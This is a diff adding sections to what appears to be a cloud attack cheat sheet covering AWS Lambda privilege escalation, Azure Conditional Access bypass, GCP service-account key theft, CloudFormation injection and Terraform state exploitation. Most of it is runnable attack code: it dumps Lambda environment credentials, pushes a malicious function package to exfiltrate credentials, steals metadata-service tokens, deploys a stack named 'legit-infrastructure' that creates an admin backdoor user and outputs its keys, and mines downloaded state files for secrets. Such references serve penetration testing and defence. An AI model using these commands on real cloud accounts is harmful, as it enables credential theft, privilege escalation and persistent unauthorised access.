@@ -1506,3 +1506,281 @@ curl --connect-timeout 5 "http://169.254.169.254/metadata/v1/")
 # Cloudflare Workers (if SSRF reaches workers)
 curl "http://169.254.169.254/cdn-cgi/trace"
 ```
+
+---
+
+## 28. AWS Lambda Privilege Escalation
+
+### Lambda-Based Role Assumption
+
+```bash
+# Enumerate Lambda functions with over-permissive execution roles
+for func in $(aws lambda list-functions --query 'Functions[*].FunctionName' --output text); do
+  role_arn=$(aws lambda get-function-configuration --function-name "$func" --query 'Role' --output text 2>/dev/null)
+  role_name=$(echo "$role_arn" | awk -F'/' '{print $NF}')
+  admin_check=$(aws iam list-attached-role-policies --role-name "$role_name" --query 'AttachedPolicies[?contains(PolicyArn, `AdministratorAccess`)].PolicyArn' --output text 2>/dev/null)
+  if [ -n "$admin_check" ]; then
+    echo "[!] $func has Admin role: $role_arn"
+  fi
+done
+
+# Exploit Lambda function to steal role credentials
+aws lambda invoke --function-name target-function --payload '{"command": "env"}' /tmp/lambda_output.txt
+cat /tmp/lambda_output.txt | jq '.environmentVariables'
+```
+
+### Lambda Environment Variable Secret Extraction
+
+```bash
+# Extract secrets from Lambda environment variables across all regions
+for region in $(aws ec2 describe-regions --query 'Regions[*].RegionName' --output text); do
+  aws lambda list-functions --region "$region" --query 'Functions[*].[FunctionName,Environment.Variables]' --output json 2>/dev/null | \
+    jq -r '.[] | select(.[1] != null) | "\.[0]: \(.[1] | keys | join(","))"' 2>/dev/null
+done
+
+# Update Lambda function to exfiltrate credentials via outbound call
+aws lambda update-function-code --function-name target-function \
+  --zip-file fileb://malicious_lambda.zip --publish
+```
+
+---
+
+## 29. Azure Conditional Access Bypass
+
+### CA Policy Enumeration and Gap Analysis
+
+```bash
+# List all conditional access policies and identify exclusions
+TOKEN=$(az account get-access-token --resource https://graph.microsoft.com --query accessToken -o tsv)
+
+# Enumerate all CA policies with their conditions
+curl -s -H "Authorization: Bearer $TOKEN" \
+  "https://graph.microsoft.com/v1.0/identity/conditionalAccess/policies" | \
+  jq '.value[] | {name: .displayName, state: .state, apps: .conditions.applications.includeApplications, excluded: .conditions.users.excludeUsers}'
+
+# Find policies with excluded users or apps (bypass candidates)
+curl -s -H "Authorization: Bearer $TOKEN" \
+  "https://graph.microsoft.com/v1.0/identity/conditionalAccess/policies" | \
+  jq -r '.value[] | select(.state == "enabled") | select(.conditions.users.excludeUsers != null or .conditions.applications.excludeApplications != null) | "\(.displayName): excluded_users=\(.conditions.users.excludeUsers // []), excluded_apps=\(.conditions.applications.excludeApplications // [])"'
+```
+
+### Legacy Authentication Bypass
+
+```bash
+# Test if legacy authentication protocols bypass CA (basic auth)
+# SMTP/IMAP/POP3 auth test via curl
+curl -s -X POST "https://outlook.office365.com/api/v2.0/me/messages" \
+  -u "user@tenant.onmicrosoft.com:password" \
+  -H "Content-Type: application/json" 2>&1 | head -5
+
+# Exchange Online legacy auth check
+curl -s "https://autodiscover-s.outlook.com/autodiscover/autodiscover.xml" \
+  -u "user@tenant.onmicrosoft.com:password" \
+  -H "Content-Type: text/xml" -d '<Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006"><Request><EMailAddress>user@tenant.onmicrosoft.com</EMailAddress></Request></Autodiscover>'
+```
+
+---
+
+## 30. GCP Service Account Key Extraction
+
+### Service Account Key Creation and Extraction
+
+```bash
+# List all service accounts with their roles
+gcloud iam service-accounts list --format="table(email,displayName)"
+
+# Check which SA keys exist and identify user-managed keys
+for sa in $(gcloud iam service-accounts list --format="value(email)"); do
+  key_count=$(gcloud iam service-accounts keys list --iam-account="$sa" --format="value(keyType)" 2>/dev/null | grep -c "USER_MANAGED" || echo 0)
+  if [ "$key_count" -gt 0 ]; then
+    echo "[!] $sa has $key_count user-managed keys"
+    gcloud iam service-accounts keys list --iam-account="$sa" --format="table(keyType,validAfterTime,validBeforeTime)"
+  fi
+done
+
+# Create new key if iam.serviceAccountKeys.create permission exists
+gcloud iam service-accounts keys create /tmp/sa_key.json \
+  --iam-account=target-sa@project.iam.gserviceaccount.com
+
+# Authenticate with extracted key
+gcloud auth activate-service-account --key-file=/tmp/sa_key.json
+gcloud config set project target-project
+gcloud iam service-accounts list
+```
+
+### GCP Compute Instance Key Exfiltration
+
+```python
+# Extract GCP service account credentials from a compromised instance
+import requests
+import json
+import subprocess
+
+def extract_gcp_sa_token():
+    """Extract service account token from GCP metadata service."""
+    try:
+        token_url = "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
+        headers = {"Metadata-Flavor": "Google"}
+        resp = requests.get(token_url, headers=headers, timeout=5)
+        if resp.ok:
+            token_data = resp.json()
+            print(f"[+] Token expires: {token_data.get('expires_in')}s")
+            return token_data["access_token"]
+    except Exception:
+        pass
+    return None
+
+def list_sa_keys(project_id, token):
+    """List service account keys using stolen token."""
+    url = f"https://iam.googleapis.com/v1/projects/{project_id}/serviceAccounts"
+    headers = {"Authorization": f"Bearer {token}"}
+    resp = requests.get(url, headers=headers)
+    accounts = resp.json().get("accounts", [])
+    for sa in accounts:
+        email = sa["email"]
+        print(f"[*] Service Account: {email}")
+    return accounts
+
+token = extract_gcp_sa_token()
+if token:
+    print(f"[+] Extracted token: {token[:20]}...")
+```
+
+---
+
+## 31. CloudFormation Template Injection
+
+### Malicious CloudFormation Stack Deployment
+
+```bash
+# Deploy a CloudFormation stack that creates an admin user
+cat > /tmp/malicious-template.yaml << 'TEMPLATE'
+AWSTemplateFormatVersion: '2010-09-09'
+Resources:
+  AdminUser:
+    Type: AWS::IAM::User
+    Properties:
+      UserName: cf-backdoor-user
+      LoginProfile:
+        Password: TempPassword123!
+  AdminPolicy:
+    Type: AWS::IAM::UserPolicy
+    Properties:
+      UserName: !Ref AdminUser
+      PolicyDocument:
+        Version: '2012-10-17'
+        Statement:
+          - Effect: Allow
+            Action: '*'
+            Resource: '*'
+  AdminAccessKey:
+    Type: AWS::IAM::AccessKey
+    Properties:
+      UserName: !Ref AdminUser
+Outputs:
+  AccessKeyId:
+    Value: !Ref AdminAccessKey
+  SecretAccessKey:
+    Value: !GetAtt AdminAccessKey.SecretAccessKey
+TEMPLATE
+
+# Deploy the malicious stack (requires cloudformation:CreateStack + iam:PassRole)
+aws cloudformation create-stack \
+  --stack-name legit-infrastructure \
+  --template-body file:///tmp/malicious-template.yaml \
+  --capabilities CAPABILITY_IAM CAPABILITY_NAMED_IAM \
+  --region us-east-1
+
+# Wait for stack completion and extract outputs
+aws cloudformation wait stack-create-complete --stack-name legit-infrastructure
+aws cloudformation describe-stacks --stack-name legit-infrastructure \
+  --query 'Stacks[0].Outputs' --output table
+```
+
+### CloudFormation Import Attacks
+
+```bash
+# Enumerate existing CloudFormation stacks for privilege escalation opportunities
+aws cloudformation describe-stacks --query 'Stacks[*].[StackName,StackStatus,RoleARN]' --output table
+
+# Detect stacks with over-permissive IAM roles
+for stack in $(aws cloudformation describe-stacks --query 'Stacks[*].StackName' --output text); do
+  role_arn=$(aws cloudformation describe-stacks --stack-name "$stack" --query 'Stacks[0].RoleARN' --output text 2>/dev/null)
+  if [ "$role_arn" != "None" ] && [ -n "$role_arn" ]; then
+    role_name=$(echo "$role_arn" | awk -F'/' '{print $NF}')
+    echo "[!] Stack $stack uses role: $role_arn"
+    aws iam list-attached-role-policies --role-name "$role_name" --query 'AttachedPolicies[*].PolicyArn' --output text
+  fi
+done
+```
+
+---
+
+## 32. Terraform State File Exploitation
+
+### Remote State File Discovery and Extraction
+
+```bash
+# Enumerate S3 buckets that may contain Terraform state files
+for bucket in $(aws s3api list-buckets --query 'Buckets[*].Name' --output text); do
+  # Common Terraform state file patterns
+  for prefix in "terraform" "tfstate" "infra" "deploy" "state"; do
+    aws s3 ls "s3://${bucket}/${prefix}/" --no-sign-request 2>/dev/null | grep -i "tfstate" && \
+      echo "[!] Found Terraform state in bucket: $bucket/$prefix/"
+  done
+done
+
+# Download Terraform state file (contains secrets, resource IDs, configuration)
+aws s3 cp s3://target-infra-bucket/terraform.tfstate /tmp/tfstate.json --no-sign-request
+
+# Extract secrets from Terraform state
+cat /tmp/tfstate.json | jq -r '.. | .secret? // .password? // .api_key? // .token? // empty' 2>/dev/null | sort -u
+
+# Parse state for sensitive outputs and variables
+cat /tmp/tfstate.json | jq -r '.outputs | to_entries[] | select(.value.value | type == "string") | "\(.key): \(.value.value)"' 2>/dev/null
+```
+
+### Terraform State Secret Mining
+
+```python
+# Automated extraction of secrets from Terraform state files
+import json
+import re
+import sys
+
+SECRET_PATTERNS = [
+    r'(?i)(password|secret|token|api_key|access_key|private_key)',
+    r'AKIA[0-9A-Z]{16}',
+    r'ghp_[a-zA-Z0-9]{36}',
+    r'eyJ[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}',
+    r'-----BEGIN (RSA |EC )?PRIVATE KEY-----',
+]
+
+def mine_tfstate(state_file):
+    """Extract all secrets from a Terraform state file."""
+    with open(state_file) as f:
+        state = json.load(f)
+
+    secrets_found = []
+
+    # Check outputs
+    for key, output in state.get('outputs', {}).items():
+        value = str(output.get('value', ''))
+        for pattern in SECRET_PATTERNS:
+            if re.search(pattern, value):
+                secrets_found.append({'location': f'output.{key}', 'pattern': pattern, 'value': value[:80]})
+
+    # Check resources
+    for resource in state.get('resources', []):
+        for attr_key, attr_val in resource.get('instances', [{}])[0].get('attributes', {}).items():
+            val_str = str(attr_val)
+            for pattern in SECRET_PATTERNS:
+                if re.search(pattern, val_str):
+                    secrets_found.append({'location': f'resource.{resource["type"]}.{attr_key}', 'pattern': pattern, 'value': val_str[:80]})
+
+    for s in secrets_found:
+        print(f"[SECRET] {s['location']}: matches {s['pattern']} -> {s['value']}")
+    return secrets_found
+
+if len(sys.argv) > 1:
+    mine_tfstate(sys.argv[1])
